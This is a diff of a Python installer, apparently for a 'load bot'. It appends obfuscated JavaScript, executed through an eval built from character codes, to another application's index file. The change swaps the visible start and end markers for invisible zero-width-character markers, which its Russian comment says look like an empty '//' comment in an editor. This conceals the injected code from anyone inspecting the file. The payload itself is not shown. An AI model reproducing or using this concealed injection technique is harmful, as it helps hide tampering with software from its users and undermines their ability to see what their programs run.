@@ -122,15 +122,20 @@ class InstallerAPI:
                 f"return {v5}[String.fromCharCode(101,118,97,108)]("
                 f"{v4}.map(function({v6}){{return String.fromCharCode({v6})}}).join(''))}})();")
 
-    @staticmethod
-    def _remove_markers(content):
-        S = "// === HASSLE LOAD BOT CODE START ==="
-        E = "// === HASSLE LOAD BOT CODE END ==="
+    # Невидимые маркеры: zero-width space (U+200B) + zero-width non-joiner (U+200C)
+    # В редакторе выглядят как пустой JS-комментарий "//"
+    _MARK_S = "//\u200b\u200c\u200b"   # start
+    _MARK_E = "//\u200c\u200b\u200c"   # end
+
+    @classmethod
+    def _remove_markers(cls, content):
+        S, E = cls._MARK_S, cls._MARK_E
         si = content.find(S)
         if si != -1:
-            ei = content.find(E, si+len(S))
-            if ei != -1: content = content[:si]+content[ei+len(E):]
-        return content.rstrip()+'\n'
+            ei = content.find(E, si + len(S))
+            if ei != -1:
+                content = content[:si] + content[ei + len(E):]
+        return content.rstrip() + '\n'
 
     def get_saved_settings(self) -> dict:
         """Возвращает сохранённые настройки в JS при старте"""
@@ -224,7 +229,7 @@ class InstallerAPI:
                     self._notify(False); return
                 with open(idx,'r',encoding='utf-8') as f: idx_content = f.read()
                 idx_content = self._remove_markers(idx_content)
-                new_text = (idx_content+"// === HASSLE LOAD BOT CODE START ===\n"+obf+"\n"+"// === HASSLE LOAD BOT CODE END ===\n")
+                new_text = (idx_content + InstallerAPI._MARK_S + "\n" + obf + "\n" + InstallerAPI._MARK_E + "\n")
                 new_text = new_text.replace('\r\n','\n').replace('\r','\n').rstrip()+'\n'
                 with open(idx,'w',encoding='utf-8',newline='\n') as f: f.write(new_text)
                 self._set_status("st-code","Установлен","cr-val ok")
